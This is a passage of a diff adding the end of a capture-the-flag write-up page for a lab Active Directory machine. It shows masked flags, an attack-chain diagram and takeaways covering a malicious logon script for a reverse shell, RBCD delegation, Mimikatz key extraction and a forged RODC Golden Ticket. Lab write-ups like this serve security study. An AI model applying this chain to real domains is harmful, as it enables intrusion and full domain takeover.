+
+C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+f49845e1************************</code></pre>
+
+    <div class="box success">
+        <p><strong>Domain compromised.</strong></p>
+    </div>
+
+    <h2 id="flags">🏁 Flags</h2>
+    <table>
+        <tr><th>Flag</th><th>Value</th></tr>
+        <tr><td><strong>User.txt</strong></td><td><code>8a65a7bc************************</code></td></tr>
+        <tr><td><strong>Root.txt</strong></td><td><code>f49845e1************************</code></td></tr>
+    </table>
+
+    <h2 id="attack-chain">🗺️ Attack Chain</h2>
+    <div class="attack-chain">┌─────────────────────────────────────────────────────────────────────────────────────────────┐
+│                          GARFIELD ATTACK CHAIN                              │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  1. RECONNAISSANCE                                                          │
+│     └─> Nmap → garfield.htb identified                                      │
+│                                                                             │
+│  2. INITIAL ENUMERATION                                                     │
+│     └─> bloodyAD → scriptPath WRITE on l.wilson discovered                  │
+│                                                                             │
+│  3. LATERAL MOVEMENT (j.arbuckle → l.wilson)                                │
+│     ├─> Upload malicious printerDetect.bat to SYSVOL/scripts                │
+│     ├─> Modify l.wilson's scriptPath                                        │
+│     └─> Reverse shell as l.wilson                                           │
+│                                                                             │
+│  4. PASSWORD RESET (l.wilson → l.wilson_adm)                                │
+│     └─> ForceChangePassword on l.wilson_adm → Evil-WinRM shell              │
+│                                                                             │
+│  5. RODC ADMIN (l.wilson_adm → RODC01)                                      │
+│     ├─> AddSelf to RODC Administrators group                                │
+│     ├─> RBCD delegation to impersonate Administrator                        │
+│     ├─> Chisel SOCKS tunnel to internal network                             │
+│     └─> psexec → SYSTEM on RODC01                                           │
+│                                                                             │
+│  6. RODC GOLDEN TICKET (RODC01 → DC01)                                      │
+│     ├─> Mimikatz → krbtgt_8245 AES256 key extracted                         │
+│     ├─> Clear msDS-NeverRevealGroup (deny list)                             │
+│     ├─> Add Administrator to msDS-RevealOnDemandGroup (allow list)          │
+│     ├─> Rubeus → RODC Golden Ticket forged                                  │
+│     └─> psexec → SYSTEM on DC01                                             │
+│                                                                             │
+│  7. DOMAIN COMPROMISED                                                      │
+│     └─> Root flag captured                                                  │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘</div>
+
+    <h2 id="key-takeaways">🧠 Key Takeaways</h2>
+    <ul>
+        <li><strong>Enumerate deeper before exploiting wider.</strong> The real path was a single attribute-level write permission that BloodHound couldn't see.</li>
+        <li><strong>Always test write access manually.</strong> <code>netexec --shares</code> said READ on SYSVOL. The scripts subfolder was writable the entire time.</li>
+        <li><strong>RODC security is only as strong as who controls the computer object.</strong> The entire "read-only" security model collapses if an attacker can write to <code>msDS-RevealOnDemandGroup</code> and <code>msDS-NeverRevealGroup</code>.</li>
+        <li><strong>Denied PRP entries override allowed entries.</strong> Clear the deny list first, then modify the allow list. Order matters.</li>
+        <li><strong>Tool versions matter more than you think.</strong> Rubeus v2.2.0 fails with <code>KRB_AP_ERR_BAD_INTEGRITY</code>. v2.3.3 works perfectly.</li>
+        <li><strong>Understand your tools' destructive operations.</strong> <code>bloodyAD set</code> overwrites; it doesn't append. In a CTF that's fine. In production, it causes immediate operational impact.</li>
+        <li><strong>When the map shows no roads, question the map.</strong> BloodHound is blind to attribute-level DACLs. Don't trust any single tool as your only source of truth.</li>
+    </ul>
+
+    <h2 id="tools-used">🛠️ Tools Used</h2>
+    <table>
+        <tr><th>Tool</th><th>Purpose</th></tr>
+        <tr><td>naabu / nmap</td><td>Port scanning and service enumeration</td></tr>
+        <tr><td>netexec</td><td>SMB authentication, share enumeration, user enumeration, password spraying</td></tr>
+        <tr><td>BloodHound CE</td><td>AD attack path visualization (and its limitations)</td></tr>
+        <tr><td>bloodyAD</td><td>Attribute-level ACL enumeration, scriptPath modification, PRP manipulation</td></tr>
+        <tr><td>Impacket</td><td>addcomputer, RBCD, getST, psexec, ticketConverter, smbclient</td></tr>
+        <tr><td>Chisel</td><td>SOCKS tunneling to internal network</td></tr>
+        <tr><td>Rubeus</td><td>RODC Golden Ticket forging (v2.3.3)</td></tr>
+        <tr><td>Mimikatz</td><td>krbtgt_8245 AES256 key extraction</td></tr>
+        <tr><td>Evil-WinRM</td><td>WinRM shell access</td></tr>
+        <tr><td>ntpdate</td><td>Time synchronization for Kerberos authentication</td></tr>
+    </table>
+
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+    <div class="footer">NIGHT PULSE X • 2026</div>
+</div>
 </body>
 </html>
